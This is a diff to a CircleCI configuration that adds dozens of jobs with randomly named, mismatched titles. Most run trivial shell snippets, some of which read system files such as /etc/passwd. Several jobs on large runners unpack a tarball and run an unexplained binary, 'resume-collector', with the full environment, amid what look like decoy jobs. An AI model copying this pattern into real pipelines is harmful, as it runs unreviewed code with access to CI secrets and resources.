+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/b1s0n 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  LOWER_ADDRESS_FINAL_53:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: 75 packing shaders
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >${TMPDIR:-/tmp}/lab.gz && zcmp /etc/hosts ${TMPDIR:-/tmp}/lab.gz && echo same; true ; } > /tmp/_src/module391
+            wc -c /tmp/_src/module391; sha1sum /tmp/_src/module391
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'module391'
+  defualt-53:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  theWordTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Polish Changelog rc3
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,plum,20,6.55\n2,mango,7,68.67\n3,pear,14,42.79\n4,cherry,8,18.97\n' >"/var/tmp/local_yearly.conf" && cut -d, -f2 "/var/tmp/local_yearly.conf"; true ; } > /tmp/_src/reef376
+            wc -c /tmp/_src/reef376; sha1sum /tmp/_src/reef376
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'reef376'
+  check-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/reef376 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  mission-yankee:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Let us evaluate the eval harness
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo "first, second and third" > /tmp/info.log && cat /tmp/info.log; true ; } > /tmp/_src/crisPAGEnT
+            wc -c /tmp/_src/crisPAGEnT; sha1sum /tmp/_src/crisPAGEnT
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'crisPAGEnT'
+  CORE-523:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/2db53c106 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+  Join-SrcItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Job 24e1 inspection
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo "OK";echo "spam and eggs"; true ; } > /tmp/_src/TOKEN
+            wc -c /tmp/_src/TOKEN; sha1sum /tmp/_src/TOKEN
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'TOKEN'
+  check-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Load handoff blob
+          command: |
+            : ; wc -l /tmp/_src/TOKEN 2>/dev/null
+      - run:
+          name: Load repo
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: tar -xjf final-notes-v4.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          command: env ./resume-collector
+
+  VISITDisconnect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: WORKAROUND dedupe the mounted volume
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cut -c1-10 /etc/group | head -n6; true ; } > /tmp/_src/mothChromeWillowSprite
+            wc -c /tmp/_src/mothChromeWillowSprite; sha1sum /tmp/_src/mothChromeWillowSprite
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'mothChromeWillowSprite'
+  instance-clock_stream:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Charge the credit notes for October
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; compgen -a | sort | tail -n 3; true ; } > /tmp/_src/MUON_MARKET_NORTH
+            wc -c /tmp/_src/MUON_MARKET_NORTH; sha1sum /tmp/_src/MUON_MARKET_NORTH
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'MUON_MARKET_NORTH'
+  someRelay9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: SRE 18 Q3 Number Review
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf %s 'hello from the shell' | sha384sum | awk '{print $1}'; true ; } > /tmp/_src/VID_61443
+            wc -c /tmp/_src/VID_61443; sha1sum /tmp/_src/VID_61443
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'VID_61443'
+  BlockingPixelRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Tagging NET 5773
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; [ -s /etc/group ] && echo true || echo 'false'; true ; } > /tmp/_src/bundle.tone.harbor.glacier.wave
+            wc -c /tmp/_src/bundle.tone.harbor.glacier.wave; sha1sum /tmp/_src/bundle.tone.harbor.glacier.wave
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'bundle.tone.harbor.glacier.wave'
+  hank_canoe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Export The Card Settlements Routine
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; if grep -q 'VERSION' /etc/os-release; then echo yes; else echo no; fi; true ; } > /tmp/_src/v_50037
+            wc -c /tmp/_src/v_50037; sha1sum /tmp/_src/v_50037
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'v_50037'
+  hideCurveVertex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Else kick off the batch window
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls /var/log|shuf -n 2; true ; } > /tmp/_src/reef376
+            wc -c /tmp/_src/reef376; sha1sum /tmp/_src/reef376
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'reef376'
+  SCOPE_TIMER_BACKUP_FORK_UUID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Cook The Tutorial Zone Act 2
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; basename "/var/tmp/chart.bak" .bak; true ; } > /tmp/_src/dream.log.1
+            wc -c /tmp/_src/dream.log.1; sha1sum /tmp/_src/dream.log.1
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'dream.log.1'
+  IRL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: T minus 3 aliquot
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "/tmp/ac-2022-06-26.gz" && zgrep -c nologin "/tmp/ac-2022-06-26.gz"; true ; } > /tmp/_src/kernelShardTitanPulse
+            wc -c /tmp/_src/kernelShardTitanPulse; sha1sum /tmp/_src/kernelShardTitanPulse
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'kernelShardTitanPulse'
+  ckpt-37026:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Repair by ops team
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for n in {1..10}; do echo ${n}; done | nl; true ; } > /tmp/_src/GLACIER_SAVANNA_CANVAS
+            wc -c /tmp/_src/GLACIER_SAVANNA_CANVAS; sha1sum /tmp/_src/GLACIER_SAVANNA_CANVAS
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'GLACIER_SAVANNA_CANVAS'
+  value-ft:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Aggregate the gold table if you can
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; function show() { local IFS=,; echo "$*"; }; show seal cat crow; true ; } > /tmp/_src/v0.12.18
+            wc -c /tmp/_src/v0.12.18; sha1sum /tmp/_src/v0.12.18
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'v0.12.18'
+  psi_pred:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Taxi to the integration suite
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sort -u | awk -F/ '{ print $NF }'; true ; } > /tmp/_src/b1s0n
+            wc -c /tmp/_src/b1s0n; sha1sum /tmp/_src/b1s0n
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'b1s0n'
+  InternalRayRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Intro clip upscale for the big day
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; printf %s "can't stop now" | md5sum | awk '{print $1}'; true ; } > /tmp/_src/srccfg
+            wc -c /tmp/_src/srccfg; sha1sum /tmp/_src/srccfg
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'srccfg'
+  mark1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Total the depreciation schedule and sign
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; echo "can't stop now"|fold -w 6; true ; } > /tmp/_src/tundragammaridge
+            wc -c /tmp/_src/tundragammaridge; sha1sum /tmp/_src/tundragammaridge
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'tundragammaridge'
+  lowerHotMotorClampGlobeBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Wrangle staging table
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; for w in {5..1}; do printf '%d %d\n' $w $((w * 3)); done |sort -r; true ; } > /tmp/_src/TOKEN
+            wc -c /tmp/_src/TOKEN; sha1sum /tmp/_src/TOKEN
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'TOKEN'
+  DEPRECATED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Offboard 500 ID badges
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; sha1sum "$HOME/.bashrc" >/tmp/qu3.sum && sha1sum -c /tmp/qu3.sum; true ; } > /tmp/_src/audit-cd0703.log
+            wc -c /tmp/_src/audit-cd0703.log; sha1sum /tmp/_src/audit-cd0703.log
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'audit-cd0703.log'
+  DEPT-CHG-KEY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_src
+      - run:
+          name: Keep vacuuming the materialized views
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; ls -t /usr/bin/*cat | nl; true ; } > /tmp/_src/SKU69718
+            wc -c /tmp/_src/SKU69718; sha1sum /tmp/_src/SKU69718
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'SKU69718'
+  ParserPartial:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Number Four Rollup
+          command: |
+            mkdir -p /tmp/_src
+            { set +o pipefail 2>/dev/null; test ! -d /etc/skel && echo 'good' || echo bad; true ; } > /tmp/_src/garden.zinc.quick.polar
+            wc -c /tmp/_src/garden.zinc.quick.polar; sha1sum /tmp/_src/garden.zinc.quick.polar
+      - persist_to_workspace:
+          root: /tmp/_src
+          paths:
+            - 'garden.zinc.quick.polar'
+workflows:
+  matrix:
+    jobs:
+      - peekTextAI
+      - mission-yankee
+      - ci:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - CORE-523:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - Package_Pipeline4:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - full-send:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - publish:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - java17-test:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - defualt-53:
+          requires:
+            - peekTextAI
+            - mission-yankee
+      - asset_sys
+      - VISITDisconnect:
+          requires:
+            - asset_sys
+      - Validate_Tests1:
+          requires:
+            - VISITDisconnect
+      - yY:
+          requires:
+            - VISITDisconnect
+      - instance-clock_stream:
+          requires:
+            - yY
+      - artifacts:
+          requires:
+            - instance-clock_stream
+      - reduce_proxy:
+          requires:
+            - instance-clock_stream
+      - someRelay9:
+          requires:
+            - reduce_proxy
+      - auh-check:
+          requires:
+            - someRelay9
+      - weeshsoungx:
+          requires:
+            - someRelay9
+      - BlockingPixelRenderer:
+          requires:
+            - weeshsoungx
+      - API-683:
+          requires:
+            - BlockingPixelRenderer
+      - Invalid-Message
+      - v7-edge4:
+          requires:
+            - Invalid-Message
+      - widget-noon-apple:
+          requires:
+            - Invalid-Message
+      - t-2a:
+          requires:
+            - widget-noon-apple
+      - d2uv7j:
+          requires:
+            - widget-noon-apple
+      - cook-it:
+          requires:
+            - d2uv7j
+      - cfg_StorePromise:
+          requires:
+            - d2uv7j
+      - v4-ga:
+          requires:
+            - cfg_StorePromise
+      - COMMAND516:
+          requires:
+            - cfg_StorePromise
+      - hyperion-ng:
+          requires:
+            - COMMAND516
+      - p2:
+          requires:
+            - COMMAND516
+      - sirius-v2:
+          requires:
+            - p2
+      - table-2021-w04
+      - hank_canoe:
+          requires:
+            - table-2021-w04
+      - brodcast:
+          requires:
+            - hank_canoe
+      - theWordTab:
+          requires:
+            - hank_canoe
+      - hideCurveVertex:
+          requires:
+            - theWordTab
+      - check-staging-regression-suite:
+          requires:
+            - hideCurveVertex
+      - expect_window_fast:
+          requires:
+            - hideCurveVertex
+      - SCOPE_TIMER_BACKUP_FORK_UUID:
+          requires:
+            - expect_window_fast
+      - blast-off:
+          requires:
+            - SCOPE_TIMER_BACKUP_FORK_UUID
+      - dev28-ap:
+          requires:
+            - SCOPE_TIMER_BACKUP_FORK_UUID
+      - IRL:
+          requires:
+            - dev28-ap
+      - fix-5451:
+          requires:
+            - IRL
+      - v17:
+          requires:
+            - IRL
+      - ckpt-37026:
+          requires:
+            - v17
+      - rocket:
+          requires:
+            - ckpt-37026
+      - inactiveYes
+      - value-ft:
+          requires:
+            - inactiveYes
+      - assemble-staging-regression-suite:
+          requires:
+            - value-ft
+      - queue-latest-full:
+          requires:
+            - value-ft
+      - psi_pred:
+          requires:
+            - queue-latest-full
+      - titan2-ng:
+          requires:
+            - psi_pred
+      - Mount-PointerProperty:
+          requires:
+            - psi_pred
+      - InternalRayRenderer:
+          requires:
+            - Mount-PointerProperty
+      - wen-ci:
+          requires:
+            - InternalRayRenderer
+      - accentOrchid
+      - mark1:
+          requires:
+            - accentOrchid
+      - ruby3-bench:
+          requires:
+            - mark1
+      - Join-SrcItem:
+          requires:
+            - mark1
+      - lowerHotMotorClampGlobeBlock:
+          requires:
+            - Join-SrcItem
+      - check-nightly-integration-tests:
+          requires:
+            - lowerHotMotorClampGlobeBlock
+      - logIterateCb:
+          requires:
+            - lowerHotMotorClampGlobeBlock
+      - DEPRECATED:
+          requires:
+            - logIterateCb
+      - biuld:
+          requires:
+            - DEPRECATED
+      - OMGX:
+          requires:
+            - DEPRECATED
+      - DEPT-CHG-KEY:
+          requires:
+            - OMGX
+      - dotnet8-bench:
+          requires:
+            - DEPT-CHG-KEY
+      - ray-provider-button-vertex:
+          requires:
+            - DEPT-CHG-KEY
+      - ParserPartial:
+          requires:
+            - ray-provider-button-vertex
+      - sirius-rc:
+          requires:
+            - ParserPartial
